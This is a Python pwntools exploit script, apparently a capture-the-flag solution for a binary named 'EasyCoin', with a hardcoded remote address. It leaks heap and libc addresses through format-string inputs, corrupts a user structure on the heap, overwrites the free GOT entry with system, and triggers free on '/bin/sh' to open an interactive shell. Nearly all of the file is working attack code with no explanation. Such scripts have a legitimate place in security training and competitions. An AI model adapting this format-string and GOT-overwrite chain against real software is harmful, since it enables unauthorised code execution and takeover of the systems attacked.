from pwn import *
from ctypes import *
import os
#import roputils as rop

remote_addr = "116.62.152.176"
remote_port = 20001

local_addr = "127.0.0.1"
local_port = 1807

pc = "./EasyCoin"
pwn_elf = ELF(pc)
pwn_rop = rop.ROP(pc)

uselibc = 2 #0 for no,1 for i386,2 for x64
local = 1
haslibc = 1
atta = 0

if uselibc == 2:
	context.arch = "amd64"
else:
	context.arch = "i386"

if uselibc ==2 and haslibc == 0:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	if uselibc == 1 and haslibc == 0:
		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else:
		libc = ELF('./libc.so.6')

if local == 1:
	if haslibc:
		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
	else:
		p = process(pc)
elif local == 0:
	p = remote(remote_addr,remote_port)
	if haslibc:
		libc = ELF('./libc.so.6')
else:
	p = remote(local_addr,local_port)
	if haslibc:
		libc = ELF('./libc.so.6')

context.log_level = True

if local:
	if atta:
		gdb.attach(p,'b *0x401474\n b *0x400c8a\n b *0x400bf7\n b *0x401717')


def sla(a,b):
	p.sendlineafter(a,b)

def sa(a,b):
	p.sendafter(a,b)

def ru(a):
	p.recvuntil(a)

def rv(a):
	return p.recv(a)


def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def register(name,password):
	sla('> ','1')
	sla('> ',name)
	sla('> ',password)
	sla('> ',password)

def login(name,password):
	sla('> ','2')
	sla('> ',name)
	sla('> ',password)

def display_user():
	sla('> ','1')

def send_coin(name,cnt):
	sla('> ','2')
	sla('> ',name)
	sla('> ',str(cnt))

def display_trans():
	sla('> ','3')

def change_password(password):
	sla('> ','4')
	sla('> ',password)

def delete():
	sla('> ','5')

def logout():
	sla('> ','6')

def leak_addr(formats):
	sa('> ',formats)

def hack():
	raw_input()
	free_got = pwn_elf.got['free']

	register('a','/bin/sh\0')
	register('b','b')
	register('c','c')
	login('c','c')
	for i in range(0x2f):
		send_coin('c',1)
	leak_addr("%9$p")
	ru(': ')
	heap_addr = int(rv(8),16)
	lg('heap_addr',heap_addr)

	leak_addr("%3$p")
	ru(': ')
	libc.address = int(rv(14),16) - libc.symbols['write'] - 0x10
	lg('libc',libc.address)
	free_addr = libc.symbols['free']
	system_addr = libc.symbols['system']
	logout()


	login('a','/bin/sh\0')
	userb_pass = heap_addr - 0x30
	send_coin('b',userb_pass)
	logout()

	login('b','b')
	change_password('\x00'*16 + p64(0x30))
	send_coin('b',1000)
	delete()

	login('a','/bin/sh\0')
	send_coin('c',1)
	logout()	

	userc_struct = heap_addr - 0x130 + 0x120
	payload = p64(userc_struct)
	register(payload,'d')

	payload = p64(userc_struct+0x40) + p64(free_got) 
	register('/bin/sh\0',payload)

	login('c',p64(free_addr))
	change_password(p64(system_addr))
	logout()

	login('a','/bin/sh\0')
	delete()
	p.interactive()
hack()